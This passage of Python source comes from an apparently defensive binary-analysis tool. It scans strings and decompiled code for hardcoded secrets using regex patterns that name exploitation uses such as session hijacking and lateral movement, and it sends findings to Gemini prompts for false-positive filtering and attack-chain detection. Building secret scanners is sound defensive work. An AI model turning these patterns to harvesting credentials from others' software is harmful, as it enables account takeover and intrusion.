        "pattern": re.compile(r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'),
        "severity": "high",
        "description": "JWT Token",
        "exploitation": "Session hijacking, privilege escalation"
    },
    "oauth_bearer": {
        "pattern": re.compile(r'Bearer\s+[A-Za-z0-9_-]{20,}'),
        "severity": "high",
        "description": "OAuth Bearer Token",
        "exploitation": "API access with token permissions"
    },
    
    # Generic Credentials (C/C++ style)
    "hardcoded_password_c": {
        "pattern": re.compile(r'(?:password|passwd|pwd)\s*=\s*["\'][^"\']{4,}["\']', re.I),
        "severity": "high",
        "description": "Hardcoded password in code",
        "exploitation": "Authentication bypass"
    },
    "hardcoded_secret_c": {
        "pattern": re.compile(r'(?:secret|api_?key|auth_?token)\s*=\s*["\'][A-Za-z0-9_-]{8,}["\']', re.I),
        "severity": "high",
        "description": "Hardcoded secret/API key",
        "exploitation": "Service access"
    },
    "const_password": {
        "pattern": re.compile(r'const\s+(?:char\s*\*|std::string)\s+\w*(?:password|passwd|secret|key)\w*\s*=\s*["\'][^"\']+["\']', re.I),
        "severity": "critical",
        "description": "Hardcoded credential in const variable",
        "exploitation": "Static credential extraction"
    },
    "define_password": {
        "pattern": re.compile(r'#define\s+\w*(?:PASSWORD|PASSWD|SECRET|API_KEY|AUTH_TOKEN)\w*\s+["\'][^"\']+["\']', re.I),
        "severity": "critical",
        "description": "Hardcoded credential in #define macro",
        "exploitation": "Compile-time credential extraction"
    },
    
    # URLs with Embedded Credentials
    "url_with_creds": {
        "pattern": re.compile(r'https?://[^:]+:[^@]+@[^\s"\'<>]+'),
        "severity": "critical",
        "description": "URL with embedded credentials",
        "exploitation": "Direct authenticated access"
    },
    
    # Internal Network / Infrastructure
    "internal_ip": {
        "pattern": re.compile(r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})'),
        "severity": "medium",
        "description": "Internal IP address",
        "exploitation": "Network reconnaissance, lateral movement target"
    },
    "ssh_host": {
        "pattern": re.compile(r'ssh\s+(?:-[a-zA-Z]\s+)*\w+@[\w.-]+'),
        "severity": "medium",
        "description": "SSH connection string",
        "exploitation": "Target identification for SSH attacks"
    },
    
    # Slack/Discord Webhooks
    "slack_webhook": {
        "pattern": re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+'),
        "severity": "high",
        "description": "Slack Webhook URL",
        "exploitation": "Message injection, phishing"
    },
    "discord_webhook": {
        "pattern": re.compile(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+'),
        "severity": "high",
        "description": "Discord Webhook URL",
        "exploitation": "Message injection, phishing"
    },
    
    # Encryption Keys (hex encoded)
    "aes_key_hex": {
        "pattern": re.compile(r'(?:aes|encryption|cipher)_?key\s*=\s*["\']?[0-9a-fA-F]{32,64}["\']?', re.I),
        "severity": "critical",
        "description": "Potential AES encryption key",
        "exploitation": "Data decryption"
    },
    "hex_key_128": {
        "pattern": re.compile(r'["\'][0-9a-fA-F]{32}["\']'),
        "severity": "medium",
        "description": "128-bit hex value (potential key)",
        "exploitation": "May be encryption key",
        "requires_context": True
    },
    "hex_key_256": {
        "pattern": re.compile(r'["\'][0-9a-fA-F]{64}["\']'),
        "severity": "medium",
        "description": "256-bit hex value (potential key)",
        "exploitation": "May be encryption key",
        "requires_context": True
    },
}

# False positive indicators for binary secrets
BINARY_SECRET_FALSE_POSITIVES = [
    # Test/Example indicators
    re.compile(r'test|example|sample|demo|mock|fake|dummy|placeholder', re.I),
    re.compile(r'xxx+|yyy+|zzz+|123+|abc+', re.I),
    re.compile(r'\*{4,}|\?{4,}', re.I),  # Masked placeholders
    # Documentation/Comments
    re.compile(r'todo|fixme|note:|see:|ref:', re.I),
    # Common non-sensitive patterns
    re.compile(r'localhost|127\.0\.0\.1|0\.0\.0\.0'),
    re.compile(r'example\.com|example\.org|test\.com'),
    # Version strings that look like keys
    re.compile(r'\d+\.\d+\.\d+\.\d+'),  # IP-like versions
]


def scan_binary_sensitive_data(
    strings: List[Dict[str, Any]],
    decompiled_code: Optional[Dict[str, Any]] = None,
    include_context: bool = True
) -> Dict[str, Any]:
    """
    Comprehensive sensitive data discovery for binaries.
    
    Scans extracted strings and optionally Ghidra-decompiled code for:
    - API keys and tokens (AWS, GCP, Azure, GitHub, etc.)
    - Database connection strings
    - Private keys and certificates
    - Hardcoded credentials
    - Internal infrastructure details
    
    Args:
        strings: Extracted strings from binary with 'value', 'offset', 'encoding'
        decompiled_code: Optional Ghidra decompilation result with 'functions' list
        include_context: Include surrounding context for findings
        
    Returns:
        Comprehensive sensitive data findings
    """
    import time
    start_time = time.time()
    
    findings: List[Dict[str, Any]] = []
    seen_values = set()  # Deduplicate
    
    # ========================================================================
    # Phase 1: Scan extracted strings
    # ========================================================================
    for idx, string_entry in enumerate(strings):
        value = string_entry.get("value", "")
        
        # Skip too short or too long strings
        if len(value) < 8 or len(value) > 5000:
            continue
        
        # Skip obvious non-secrets (pure numeric, whitespace-heavy)
        if value.isdigit() or value.count(' ') > len(value) * 0.5:
            continue
        
        for secret_type, pattern_info in BINARY_SECRET_PATTERNS.items():
            pattern = pattern_info["pattern"]
            match = pattern.search(value)
            
            if match:
                matched_text = match.group()
                
                # Skip if already seen this exact value
                if matched_text in seen_values:
                    continue
                
                # Check for false positives
                is_false_positive = False
                for fp_pattern in BINARY_SECRET_FALSE_POSITIVES:
                    if fp_pattern.search(value):
                        is_false_positive = True
                        break
                
                if is_false_positive:
                    continue
                
                # For context-requiring patterns, check surrounding strings
                if pattern_info.get("requires_context"):
                    context_strings = _get_surrounding_strings(strings, idx, 10)
                    if not _has_confirming_context(secret_type, context_strings):
                        continue
                
                seen_values.add(matched_text)
                
                finding = {
                    "type": secret_type,
                    "severity": pattern_info["severity"],
                    "description": pattern_info["description"],
                    "exploitation": pattern_info.get("exploitation", ""),
                    "value": matched_text[:100],
                    "masked_value": _mask_sensitive_value(matched_text),
                    "full_string": value[:200] if include_context else None,
                    "source": "strings",
                    "offset": string_entry.get("offset"),
                    "encoding": string_entry.get("encoding"),
                    "string_category": string_entry.get("category"),
                    "confidence": _calculate_secret_confidence(secret_type, matched_text, value),
                }
                
                findings.append(finding)
    
    # ========================================================================
    # Phase 2: Scan decompiled code (if available)
    # ========================================================================
    if decompiled_code and "functions" in decompiled_code:
        for func in decompiled_code.get("functions", []):
            func_name = func.get("name", "unknown")
            decompiled = func.get("decompiled", "")
            entry_addr = func.get("entry", "")
            
            if not decompiled or len(decompiled) < 10:
                continue
            
            # Scan decompiled code for secrets
            for secret_type, pattern_info in BINARY_SECRET_PATTERNS.items():
                pattern = pattern_info["pattern"]
                
                for match in pattern.finditer(decompiled):
                    matched_text = match.group()
                    
                    if matched_text in seen_values:
                        continue
                    
                    # Check false positives
                    is_false_positive = False
                    for fp_pattern in BINARY_SECRET_FALSE_POSITIVES:
                        if fp_pattern.search(decompiled[max(0, match.start()-50):match.end()+50]):
                            is_false_positive = True
                            break
                    
                    if is_false_positive:
                        continue
                    
                    seen_values.add(matched_text)
                    
                    # Get line context
                    line_num = decompiled[:match.start()].count('\n') + 1
                    lines = decompiled.split('\n')
                    start_line = max(0, line_num - 3)
                    end_line = min(len(lines), line_num + 2)
                    context = '\n'.join(lines[start_line:end_line])
                    
                    finding = {
                        "type": secret_type,
                        "severity": pattern_info["severity"],
                        "description": pattern_info["description"],
                        "exploitation": pattern_info.get("exploitation", ""),
                        "value": matched_text[:100],
                        "masked_value": _mask_sensitive_value(matched_text),
                        "source": "decompiled_code",
                        "function_name": func_name,
                        "entry_address": entry_addr,
                        "line_number": line_num,
                        "code_context": context[:500] if include_context else None,
                        "confidence": _calculate_secret_confidence(secret_type, matched_text, context),
                    }
                    
                    findings.append(finding)
    
    elapsed = time.time() - start_time
    
    # Build summary
    summary = {
        "total_findings": len(findings),
        "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0},
        "by_type": {},
        "by_source": {"strings": 0, "decompiled_code": 0},
    }
    
    for f in findings:
        sev = f.get("severity", "medium")
        t = f.get("type", "unknown")
        src = f.get("source", "unknown")
        
        if sev in summary["by_severity"]:
            summary["by_severity"][sev] += 1
        summary["by_type"][t] = summary["by_type"].get(t, 0) + 1
        if src in summary["by_source"]:
            summary["by_source"][src] += 1
    
    # Sort by severity and confidence
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    findings.sort(key=lambda x: (severity_order.get(x.get("severity", "low"), 4), -x.get("confidence", 0)))
    
    logger.info(f"Sensitive data scan: {len(findings)} findings in {elapsed:.1f}s")
    
    return {
        "findings": findings,
        "summary": summary,
        "scan_stats": {
            "strings_scanned": len(strings),
            "functions_scanned": len(decompiled_code.get("functions", [])) if decompiled_code else 0,
            "secrets_found": len(findings),
            "scan_time": elapsed,
        }
    }


def _get_surrounding_strings(strings: List[Dict], idx: int, window: int) -> List[str]:
    """Get surrounding strings for context analysis."""
    start = max(0, idx - window)
    end = min(len(strings), idx + window + 1)
    return [s.get("value", "") for s in strings[start:end]]


def _has_confirming_context(secret_type: str, context_strings: List[str]) -> bool:
    """Check if surrounding context confirms the secret type."""
    context_text = " ".join(context_strings).lower()
    
    context_keywords = {
        "aws_secret_key": ["aws", "amazon", "s3", "ec2", "lambda", "iam", "access_key", "secret_key"],
        "twilio_auth_token": ["twilio", "sms", "voice", "account_sid", "auth_token"],
        "paypal_client_id": ["paypal", "payment", "checkout", "client_id"],
        "hex_key_128": ["aes", "encrypt", "decrypt", "cipher", "key", "iv", "secret"],
        "hex_key_256": ["aes", "encrypt", "decrypt", "cipher", "key", "secret", "sha"],
    }
    
    keywords = context_keywords.get(secret_type, [])
    return any(kw in context_text for kw in keywords)


def _calculate_secret_confidence(secret_type: str, matched_text: str, context: str) -> int:
    """Calculate confidence score (0-100) for a secret finding."""
    confidence = 50  # Base confidence
    
    # High-entropy patterns get bonus
    if len(set(matched_text)) / len(matched_text) > 0.7:
        confidence += 15
    
    # Known prefixes get bonus
    high_confidence_types = [
        "aws_access_key", "github_token", "github_oauth", "gitlab_token",
        "stripe_secret", "private_key_rsa", "private_key_ec", "mongodb_uri",
        "postgres_uri", "slack_webhook", "discord_webhook", "gcp_api_key"
    ]
    if secret_type in high_confidence_types:
        confidence += 25
    
    # Context confirmation
    context_lower = context.lower()
    confirming_terms = ["secret", "key", "password", "token", "auth", "credential", "api"]
    if any(term in context_lower for term in confirming_terms):
        confidence += 10
    
    # Length-based confidence
    if len(matched_text) > 30:
        confidence += 5
    
    # Penalty for potential false positives
    fp_terms = ["test", "example", "sample", "demo", "fake", "dummy", "xxx"]
    if any(term in context_lower for term in fp_terms):
        confidence -= 30
    
    return max(0, min(100, confidence))


async def verify_binary_sensitive_findings(
    findings: List[Dict[str, Any]],
    decompiled_code: Optional[Dict[str, Any]] = None,
    batch_size: int = 15
) -> Dict[str, Any]:
    """
    Use AI to verify and filter false positives from sensitive data findings.
    
    Args:
        findings: List of sensitive data findings to verify
        decompiled_code: Optional Ghidra decompilation for additional context
        batch_size: Findings per AI call
        
    Returns:
        Verified findings with AI verdicts
    """
    from google import genai
    from google.genai import types
    import json
    
    if not findings:
        return {
            "verified_findings": [],
            "filtered_out": [],
            "verification_stats": {"total": 0, "verified": 0, "filtered": 0}
        }
    
    # Check for API key
    if not settings.gemini_api_key:
        logger.warning("Gemini API key not configured - returning findings without AI verification")
        return {
            "verified_findings": findings,
            "filtered_out": [],
            "verification_stats": {
                "total": len(findings),
                "verified": len(findings),
                "filtered": 0,
                "skipped_reason": "AI API key not configured"
            }
        }
    
    logger.info(f"AI verification: Processing {len(findings)} sensitive data findings")
    client = genai.Client(api_key=settings.gemini_api_key)
    
    verified_findings = []
    filtered_out = []
    
    # Process in batches
    for i in range(0, len(findings), batch_size):
        batch = findings[i:i + batch_size]
        
        # Prepare findings for AI review
        findings_for_review = []
        for idx, finding in enumerate(batch):
            findings_for_review.append({
                "id": idx,
                "type": finding.get("type"),
                "severity": finding.get("severity"),
                "description": finding.get("description"),
                "masked_value": finding.get("masked_value"),
                "source": finding.get("source"),
                "context": finding.get("code_context") or finding.get("full_string", "")[:300],
                "function": finding.get("function_name", ""),
                "confidence": finding.get("confidence", 50),
            })
        
        prompt = f"""You are an expert binary security analyst reviewing potential hardcoded secrets and sensitive data found in a compiled application.

For each finding, determine if it's:
1. **REAL** - A genuine hardcoded secret that poses security risk
2. **FALSE_POSITIVE** - Not a real secret (test data, placeholder, example, documentation)
3. **SUSPICIOUS** - Possibly real but needs manual confirmation

FALSE POSITIVE indicators:
- Contains "test", "example", "sample", "demo", "fake", "dummy", "placeholder"
- All zeros, all X's, sequential patterns (123456, abcdef)
- Documentation URLs or example.com references  
- Clearly masked or redacted values
- Development/debug constants
- Version strings that look like keys
- Public keys (only private keys are secrets)

REAL secret indicators:
- High entropy (random-looking) values
- Matches known API key formats exactly
- Found near authentication/crypto code
- Embedded in connection strings with valid hostnames

Review these {len(findings_for_review)} findings:

{json.dumps(findings_for_review, indent=2)}

Respond with JSON array:
[
  {{"id": 0, "verdict": "REAL|FALSE_POSITIVE|SUSPICIOUS", "confidence": 0-100, "reason": "Brief explanation"}},
  ...
]

Be conservative - only mark FALSE_POSITIVE if confident. Real API keys are often high-entropy strings."""

        try:
            response = sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                ),
                max_retries=3,
                base_delay=2.0,
                timeout_seconds=90.0,
                operation_name="AI sensitive data verification"
            )
            
            if response is None:
                # AI failed - keep all findings
                verified_findings.extend(batch)
                continue
            
            # Parse response
            json_match = re.search(r'\[[\s\S]*\]', response.text)
            if json_match:
                verdicts = json.loads(json_match.group())
                verdict_map = {v.get("id"): v for v in verdicts}
                
                for idx, finding in enumerate(batch):
                    verdict = verdict_map.get(idx, {})
                    verdict_type = verdict.get("verdict", "SUSPICIOUS")
                    
                    finding["ai_verdict"] = verdict_type
                    finding["ai_confidence"] = verdict.get("confidence", 50)
                    finding["ai_reason"] = verdict.get("reason", "")
                    
                    if verdict_type in ["REAL", "SUSPICIOUS"]:
                        verified_findings.append(finding)
                    else:
                        filtered_out.append(finding)
            else:
                # Parsing failed - keep all
                verified_findings.extend(batch)
                
        except Exception as e:
            logger.warning(f"AI verification batch failed: {e}, keeping all findings")
            verified_findings.extend(batch)
    
    # Sort verified findings
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    verified_findings.sort(key=lambda x: (
        severity_order.get(x.get("severity", "low"), 4),
        -x.get("ai_confidence", 0)
    ))
    
    logger.info(f"AI verification complete: {len(verified_findings)} verified, {len(filtered_out)} filtered")
    
    return {
        "verified_findings": verified_findings,
        "filtered_out": filtered_out,
        "verification_stats": {
            "total": len(findings),
            "verified": len(verified_findings),
            "filtered": len(filtered_out),
            "critical_verified": sum(1 for f in verified_findings if f.get("severity") == "critical"),
            "high_verified": sum(1 for f in verified_findings if f.get("severity") == "high"),
        }
    }


async def comprehensive_binary_sensitive_scan(
    strings: List[Dict[str, Any]],
    decompiled_code: Optional[Dict[str, Any]] = None,
    verify_with_ai: bool = True
) -> Dict[str, Any]:
    """
    Full sensitive data discovery pipeline for binaries.
    
    Combines:
    1. Pattern-based secret detection
    2. Context-aware filtering
    3. AI verification (optional)
    
    Args:
        strings: Extracted binary strings
        decompiled_code: Optional Ghidra decompilation
        verify_with_ai: Whether to use AI for false positive filtering
        
    Returns:
        Complete sensitive data scan results
    """
    import time
    start_time = time.time()
    
    # Phase 1: Pattern-based detection
    scan_result = scan_binary_sensitive_data(
        strings=strings,
        decompiled_code=decompiled_code,
        include_context=True
    )
    
    initial_findings = scan_result["findings"]
    logger.info(f"Pattern scan found {len(initial_findings)} potential secrets")
    
    # Phase 2: AI verification (if enabled and findings exist)
    if verify_with_ai and initial_findings:
        verification_result = await verify_binary_sensitive_findings(
            findings=initial_findings,
            decompiled_code=decompiled_code
        )
        
        final_findings = verification_result["verified_findings"]
        filtered_out = verification_result["filtered_out"]
        verification_stats = verification_result["verification_stats"]
    else:
        final_findings = initial_findings
        filtered_out = []
        verification_stats = {"total": len(initial_findings), "verified": len(initial_findings), "filtered": 0}
    
    elapsed = time.time() - start_time
    
    # Build final summary
    summary = {
        "total_findings": len(final_findings),
        "filtered_as_false_positive": len(filtered_out),
        "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0},
        "by_type": {},
        "ai_verified": verify_with_ai and bool(settings.gemini_api_key),
    }
    
    for f in final_findings:
        sev = f.get("severity", "medium")
        t = f.get("type", "unknown")
        if sev in summary["by_severity"]:
            summary["by_severity"][sev] += 1
        summary["by_type"][t] = summary["by_type"].get(t, 0) + 1
    
    logger.info(f"Sensitive data scan complete: {len(final_findings)} verified secrets in {elapsed:.1f}s")
    
    return {
        "findings": final_findings,
        "filtered_out": filtered_out,
        "summary": summary,
        "verification_stats": verification_stats,
        "scan_stats": {
            "strings_scanned": scan_result["scan_stats"]["strings_scanned"],
            "functions_scanned": scan_result["scan_stats"]["functions_scanned"],
            "initial_findings": len(initial_findings),
            "final_findings": len(final_findings),
            "total_scan_time": elapsed,
        }
    }


# =============================================================================
# PART 4: UNIFIED BINARY FINDINGS VERIFICATION
# =============================================================================

async def verify_binary_findings_unified(
    pattern_findings: List[Dict[str, Any]],
    cve_findings: List[Dict[str, Any]],
    sensitive_findings: List[Dict[str, Any]],
    vuln_hunt_findings: Optional[List[Dict[str, Any]]] = None,
    decompiled_code: Optional[Dict[str, Any]] = None,
    binary_metadata: Optional[Dict[str, Any]] = None,
    is_legitimate_software: bool = False,
    legitimacy_indicators: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    Unified AI verification for all binary analysis findings.
    
    Combines and verifies findings from:
    - Pattern-based vulnerability scanning
    - CVE lookups
    - Sensitive data discovery
    - Multi-pass AI vulnerability hunt
    
    Uses Gemini to prioritize and eliminate false positives, and detect attack chains.
    
    Args:
        pattern_findings: Vulnerabilities from pattern scanning
        cve_findings: CVEs from library lookup
        sensitive_findings: Secrets from sensitive data scan
        vuln_hunt_findings: Vulnerabilities from AI multi-pass hunting
        decompiled_code: Optional Ghidra decompilation for context
        binary_metadata: Binary metadata for context
        is_legitimate_software: Whether binary appears to be from a known publisher
        legitimacy_indicators: List of reasons why it appears legitimate
        
    Returns:
        Unified, prioritized findings with AI confidence scores and attack chains
    """
    vuln_hunt_findings = vuln_hunt_findings or []
    
    if not settings.gemini_api_key:
        logger.warning("No Gemini API key - returning all findings unverified")
        return {
            "verified_vulnerabilities": pattern_findings,
            "verified_cves": cve_findings,
            "verified_secrets": sensitive_findings,
            "verified_vuln_hunt": vuln_hunt_findings,
            "attack_chains": [],
            "summary": {
                "total_findings": len(pattern_findings) + len(cve_findings) + len(sensitive_findings) + len(vuln_hunt_findings),
                "ai_verified": False,
                "vulnerabilities": len(pattern_findings),
                "cves": len(cve_findings),
                "secrets": len(sensitive_findings),
                "vuln_hunt": len(vuln_hunt_findings),
            },
            "prioritized_actions": []
        }
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Build context
        context_parts = []
        
        # Add legitimacy context FIRST - critical for accurate verification
        if is_legitimate_software:
            context_parts.append(f"""=== LEGITIMATE SOFTWARE CONTEXT ===
This binary appears to be legitimate software from a known publisher.
Legitimacy Indicators: {', '.join(legitimacy_indicators or ['Known product/publisher'])}

CRITICAL FALSE POSITIVE FILTER RULES:
1. APIs like CreateProcess, ShellExecute, InternetOpen, VirtualAlloc are NORMAL
2. strcpy/sprintf/memcpy are often used SAFELY in legitimate code (check for bounds checking)
3. Do NOT mark standard software features as vulnerabilities
4. Only flag issues with CLEAR exploitation evidence
5. Be AGGRESSIVE in filtering false positives for legitimate software
6. Focus on ACTUAL security bugs, not theoretical concerns
=================================================""")
        
        if binary_metadata:
            context_parts.append(f"""Binary Context:
- File Type: {binary_metadata.get('file_type', 'Unknown')}
- Architecture: {binary_metadata.get('architecture', 'Unknown')}
- Is Packed: {binary_metadata.get('is_packed', False)}
- Mitigations: {json.dumps(binary_metadata.get('mitigations', {}), default=str)}""")
        
        if decompiled_code:
            # Include a sample of decompiled functions for context
            functions = decompiled_code.get("functions", [])[:5]
            if functions:
                func_preview = "\n\n".join([
                    f"// {f.get('name', 'unknown')}\n{f.get('code', '')[:500]}..."
                    for f in functions if f.get('code')
                ])
                context_parts.append(f"Sample Decompiled Functions:\n```c\n{func_preview}\n```")
        
        context = "\n\n".join(context_parts)
        
        # Build findings summary - include vuln_hunt findings
        findings_summary = {
            "pattern_vulnerabilities": [
                {
                    "id": i,
                    "category": f.get("category"),
                    "severity": f.get("severity"),
                    "title": f.get("title"),
                    "evidence": (f.get("evidence") or "")[:200],
                    "function": f.get("function_name"),
                }
                for i, f in enumerate(pattern_findings[:30])
            ],
            "cve_vulnerabilities": [
                {
                    "id": i,
                    "cve_id": f.get("cve_id"),
                    "library": f.get("library_name"),
                    "severity": f.get("severity"),
                    "description": (f.get("description") or "")[:150],
                }
                for i, f in enumerate(cve_findings[:20])
            ],
            "sensitive_data": [
                {
                    "id": i,
                    "type": f.get("type"),
                    "severity": f.get("severity"),
                    "masked_value": f.get("masked_value"),
                    "context": (f.get("context") or "")[:100],
                }
                for i, f in enumerate(sensitive_findings[:20])
            ],
            # NEW: Include vuln_hunt findings from multi-pass AI analysis
            "vuln_hunt_findings": [
                {
                    "id": i,
                    "title": f.get("title"),
                    "severity": f.get("severity"),
                    "category": f.get("category"),
                    "cwe_id": f.get("cwe_id"),
                    "function_name": f.get("function_name"),
                    "entry_address": f.get("entry_address"),
                    "description": (f.get("description") or "")[:200],
                    "confidence": f.get("confidence", 0.5),
                    "code_snippet": (f.get("code_snippet") or "")[:300],
                }
                for i, f in enumerate(vuln_hunt_findings[:25])
            ]
        }
        
        # Build legitimacy-aware prompt
        if is_legitimate_software:
            prompt = f"""You are a binary security expert analyzing findings from automated scans of a LEGITIMATE software binary.

=== IMPORTANT: LEGITIMATE SOFTWARE DETECTED ===
This binary appears to be from a known, trusted publisher.
Legitimacy Indicators: {', '.join(legitimacy_indicators or ['Known product/publisher'])}

Your job is to AGGRESSIVELY FILTER FALSE POSITIVES. Automated scanners often flag normal patterns in legitimate software.

{context}

FINDINGS TO VERIFY:
{json.dumps(findings_summary, indent=2)}

FALSE POSITIVE CRITERIA (FILTER THESE):
- APIs like CreateProcess, ShellExecute, WriteFile, InternetOpen are NORMAL for most software
- strcpy/sprintf used WITH bounds checking (strlen, sizeof nearby) = FALSE POSITIVE
- VirtualAlloc, VirtualProtect used for JIT, plugins, or normal memory = FALSE POSITIVE
- Sleep, GetTickCount used for timing/animation = FALSE POSITIVE
- Registry access for settings = FALSE POSITIVE
- Network APIs for legitimate network functionality = FALSE POSITIVE
- Crypto APIs for normal encryption features = FALSE POSITIVE

TRUE POSITIVE CRITERIA (KEEP THESE):
- Actual buffer overflows with no bounds checking AND user-controlled input
- Known CVEs in bundled libraries with confirmed exploit code
- Hardcoded credentials, API keys, or passwords that are exploitable
- Actual malware indicators (C2 patterns, shellcode, process hollowing)

Return JSON with MOST findings marked as FALSE_POSITIVE for legitimate software:
{{
    "verified_pattern_vulns": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "priority": 1-10, "reason": "..."}}
    ],
    "verified_cves": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "exploitability": "HIGH|MEDIUM|LOW", "reason": "..."}}
    ],
    "verified_secrets": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "risk": "HIGH|MEDIUM|LOW", "reason": "..."}}
    ],
    "verified_vuln_hunt": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "exploitability": "HIGH|MEDIUM|LOW", "reason": "..."}}
    ],
    "attack_chains": [],
    "prioritized_actions": [
        {{"priority": 1, "category": "vulnerability|cve|secret|vuln_hunt", "finding_id": 0, "action": "...", "recommendation": "..."}}
    ],
    "overall_risk": "LOW",
    "summary": "This is legitimate software. Most findings are false positives from automated scanning."
}}

Be VERY conservative - only mark as REAL if you're CERTAIN it's exploitable."""

        else:
            prompt = f"""You are a binary security expert analyzing findings from automated scans of a compiled binary.

{context}

FINDINGS TO VERIFY:
{json.dumps(findings_summary, indent=2)}

For each category, identify:
1. TRUE POSITIVES - Real security issues that need attention
2. FALSE POSITIVES - Benign patterns, test code, or false alarms
3. PRIORITY - Critical items requiring immediate action
4. ATTACK CHAINS - Related findings that could be chained together for exploitation

Return JSON:
{{
    "verified_pattern_vulns": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "priority": 1-10, "reason": "..."}}
    ],
    "verified_cves": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "exploitability": "HIGH|MEDIUM|LOW", "reason": "..."}}
    ],
    "verified_secrets": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "risk": "HIGH|MEDIUM|LOW", "reason": "..."}}
    ],
    "verified_vuln_hunt": [
        {{"id": 0, "verdict": "REAL|FALSE_POSITIVE", "confidence": 1-100, "exploitability": "HIGH|MEDIUM|LOW", "reason": "..."}}
    ],
    "attack_chains": [
        {{"chain_id": 1, "name": "Chain name", "findings": ["pattern_0", "vuln_hunt_2", "secret_1"], "description": "How these connect", "severity": "CRITICAL|HIGH|MEDIUM"}}
    ],
    "prioritized_actions": [
        {{"priority": 1, "category": "vulnerability|cve|secret|vuln_hunt", "finding_id": 0, "action": "Immediate fix required", "recommendation": "..."}}
    ],
    "overall_risk": "CRITICAL|HIGH|MEDIUM|LOW",
    "summary": "Brief overall assessment"
}}

Focus on:
- Buffer overflows and memory corruption (highest priority in binaries)
- Known CVEs with public exploits
- Hardcoded credentials and API keys
- Missing security mitigations
- Attack chains that combine multiple vulnerabilities

Be concise but thorough."""

        response = await asyncio.to_thread(
            lambda: sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                ),
                max_retries=3,
                base_delay=2.0,
                timeout_seconds=120.0,
                operation_name="Unified binary findings verification"
            )
        )
        
        if response is None:
            logger.warning("AI verification failed - returning all findings unverified")
            return _build_unverified_response(pattern_findings, cve_findings, sensitive_findings, vuln_hunt_findings)
        
        # Parse AI response
        json_match = re.search(r'\{[\s\S]*\}', response.text)
        if not json_match:
            logger.warning("Could not parse AI verification response")
            return _build_unverified_response(pattern_findings, cve_findings, sensitive_findings, vuln_hunt_findings)
        
        ai_result = json.loads(json_match.group())
        
        # Apply verdicts to findings
        verified_vulns = _apply_verdicts(
            pattern_findings, 
            ai_result.get("verified_pattern_vulns", []),
            "vulnerability"
        )
        verified_cves = _apply_verdicts(
            cve_findings,
            ai_result.get("verified_cves", []),
            "cve"
        )
        verified_secrets = _apply_verdicts(
            sensitive_findings,
            ai_result.get("verified_secrets", []),
            "secret"
        )
        verified_vuln_hunt = _apply_verdicts(
            vuln_hunt_findings,
            ai_result.get("verified_vuln_hunt", []),
            "vuln_hunt"
        )
        
        # Build prioritized actions
        prioritized_actions = ai_result.get("prioritized_actions", [])
        attack_chains = ai_result.get("attack_chains", [])
        
        total_input = len(pattern_findings) + len(cve_findings) + len(sensitive_findings) + len(vuln_hunt_findings)
        total_verified = len(verified_vulns["verified"]) + len(verified_cves["verified"]) + len(verified_secrets["verified"]) + len(verified_vuln_hunt["verified"])
        total_filtered = len(verified_vulns["filtered"]) + len(verified_cves["filtered"]) + len(verified_secrets["filtered"]) + len(verified_vuln_hunt["filtered"])
        
        return {
            "verified_vulnerabilities": verified_vulns["verified"],
            "filtered_vulnerabilities": verified_vulns["filtered"],
            "verified_cves": verified_cves["verified"],
            "filtered_cves": verified_cves["filtered"],
            "verified_secrets": verified_secrets["verified"],
            "filtered_secrets": verified_secrets["filtered"],
            "verified_vuln_hunt": verified_vuln_hunt["verified"],
            "filtered_vuln_hunt": verified_vuln_hunt["filtered"],
            "attack_chains": attack_chains,
            "summary": {
                "total_findings": total_input,
                "verified_total": total_verified,
                "filtered_total": total_filtered,
                "ai_verified": True,
                "overall_risk": ai_result.get("overall_risk", "UNKNOWN"),
                "ai_summary": ai_result.get("summary", ""),
                "attack_chains_found": len(attack_chains),
                "vulnerabilities": {
                    "total": len(pattern_findings),
                    "verified": len(verified_vulns["verified"]),
                    "filtered": len(verified_vulns["filtered"]),
                },
                "cves": {
                    "total": len(cve_findings),
                    "verified": len(verified_cves["verified"]),
                    "filtered": len(verified_cves["filtered"]),
                },
                "secrets": {
                    "total": len(sensitive_findings),
                    "verified": len(verified_secrets["verified"]),
                    "filtered": len(verified_secrets["filtered"]),
                },
                "vuln_hunt": {
                    "total": len(vuln_hunt_findings),
                    "verified": len(verified_vuln_hunt["verified"]),
                    "filtered": len(verified_vuln_hunt["filtered"]),
                },
            },
            "prioritized_actions": prioritized_actions,
        }
        
    except Exception as e:
        logger.error(f"Unified verification failed: {e}")
        return _build_unverified_response(pattern_findings, cve_findings, sensitive_findings, vuln_hunt_findings)


def _build_unverified_response(
    pattern_findings: List[Dict],
    cve_findings: List[Dict],
    sensitive_findings: List[Dict],
    vuln_hunt_findings: Optional[List[Dict]] = None
) -> Dict[str, Any]:
    """Build response when AI verification is unavailable."""
    vuln_hunt_findings = vuln_hunt_findings or []
    total = len(pattern_findings) + len(cve_findings) + len(sensitive_findings) + len(vuln_hunt_findings)
    return {
